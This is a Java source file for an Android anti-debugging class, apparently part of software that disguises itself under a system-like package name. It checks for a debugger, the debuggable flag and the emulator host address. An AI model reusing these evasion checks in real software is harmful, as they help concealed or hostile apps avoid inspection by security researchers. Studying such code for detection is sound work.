package com.android.deviceinfo.util;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

import android.content.pm.ApplicationInfo;
import android.os.Debug;
import android.util.Log;

import com.android.deviceinfo.Beep;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;

public class AntiDebug {

	public boolean checkFlag() {
		boolean debug = (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", "checkFlag: " + debug);
		}
		return debug;
	}

	public boolean checkPing() {
		String host = "10.0.2.2";
		boolean reachable = true;
		try {
			InetAddress in = InetAddress.getByName(host.toString());
			reachable = in.isReachable(2000);
		} catch (UnknownHostException e) {
			reachable = false;
		} catch (IOException e) {
			reachable = false;
		}
		
		return false;
	}
	public boolean checkIp() {
		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
		checkDebugMode.execute("");

		Utils.sleep(2000);

		if (Cfg.DEBUGANTI) {
			Log.w("QZ", "checkIp: " + checkDebugMode.IsDebug);
		}
		return checkDebugMode.IsDebug;
	}

	public boolean checkConnected() {
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", "checkConnected: " + Debug.isDebuggerConnected());
		}
		return Debug.isDebuggerConnected();
	}

	public boolean isDebug() {
		if (Cfg.DEBUGANTI) {
			Beep.bip();
			Beep.bip();
			Beep.bip();
		}
		return checkFlag() || checkConnected() ;
	}
}
